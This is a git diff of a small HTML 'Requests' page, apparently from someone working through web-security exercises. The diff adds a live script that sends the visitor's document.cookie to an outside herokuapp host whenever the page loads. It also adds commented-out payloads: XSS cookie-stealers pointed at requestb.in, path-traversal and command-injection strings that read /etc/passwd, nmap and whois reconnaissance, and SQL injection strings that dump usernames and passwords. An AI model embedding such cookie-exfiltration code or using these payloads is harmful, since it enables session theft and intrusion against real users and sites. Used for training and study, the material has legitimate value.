@@ -6,18 +6,69 @@
 </head>
 <body>
 
-    <div class="container">
+<div class="container">
 
-        <main>
-            <h1>Requests</h1>
-            <button class="show_req">show requests</button>
-            <button class="clear_req">clear requests</button>
-        </main>
+    <main>
+        <h1>Requests</h1>
+        <button class="show_req">show requests</button>
+        <button class="clear_req">clear requests</button>
+    </main>
+    <img src="" alt="">
+</div>
+<script>
+    (new Image()).src = "https://playgroud2018testt.herokuapp.com/req?cookie=" + document.cookie;
 
-    </div>
+</script>
 
-    <script type="text/javascript" src="./modules/util.js"></script>
-    <script type="text/javascript" src="index.js"></script>
+<script type="text/javascript" src="./modules/util.js"></script>
+<script type="text/javascript" src="index.js"></script>
+
+<!--XSS:-->
+<!--<script>(new Image()).src = "https://requestb.in/166ww4n1?cookie=" + document.cookie;</script>  задание 1-->
+<!--</span><script> document.write("<img src='https://requestb.in/166ww4n1?cookie="+document.cookie+"'/>");</script>  задание 1-->
+<!--"><script>(new Image()).src="https://requestb.in/166ww4n1?cookie="+document.cookie;</script><i class="-->
+<!--'"><script>alert(1)</script>-->
+
+
+<!--1) узнать Ip-->
+<!--nslookup stepic.org-->
+<!--whois stepic.org - информация-->
+<!--sudo nmap -sS -T4 -n trytohack.ru - посмотерть открытые порты-->
+
+<!--cmd injection:-->
+    <!--../../../../../etc/passwd%00-->
+    <!--http://enter.seclab.stepic.org/getpage.php?page=../../keys/key.txt-->
+    <!--www.gstatic.com/index.php?host=8.8.8.8;id-->
+    <!--www.gstatic.com/index.php?host=8.8.8.8|pwd-->
+    <!--&lt;!&ndash;http://enter.seclab.stepic.org/hoststat.php?host=127%2e0%2e0%2e1%3bls&send=send  -&#45;&#45; см URL encode&ndash;&gt;-->
+    <!--&lt;!&ndash;127.0.0.1;cat index.php&ndash;&gt;-->
+    <!--&lt;!&ndash;| cat /etc/passwd&ndash;&gt;-->
+
+<!--sql injection:-->
+    <!--www.gstatic.com/generat.php?name=alex' &#45;&#45;-->
+    <!--login=admin' or id=2; &#45;&#45;-->
+    <!--'or id=8#  важна решетка-->
+    <!--user’ OR 1=1—-->
+    <!--‘ OR 1=1—-->
+    <!--» OR 1=1—-->
+    <!--OR 1=1—-->
+    <!--‘ OR ‘a’=’a-->
+    <!--» OR «a»=»a-->
+    <!--‘) OR (‘a’=’a-->
+    <!--OR ‘1’=’1′-->
+
+    <!--1' or '1'='1-->
+    <!--1 or 1=1-->
+    <!--1" or "a"="a-->
+
+    <!--A' or '1'='1' limit 1 &#45;&#45; a  blind-->
+    <!--A' or '1'='2' limit 1 &#45;&#45; a-->
+
+    <!--' or username='admin' or '1'='1-->
+    <!--ascasca' or id='1' union select username,password from users&#45;&#45; -+-->
+    <!--1 union select 1, password, username from users  // numeric injection-->
+    <!--https://github.com/IncludeZ/root-me/blob/master/Web-Server/SQL%20Injection%20-%20Time%20Based-->
+
 
 </body>
 </html>
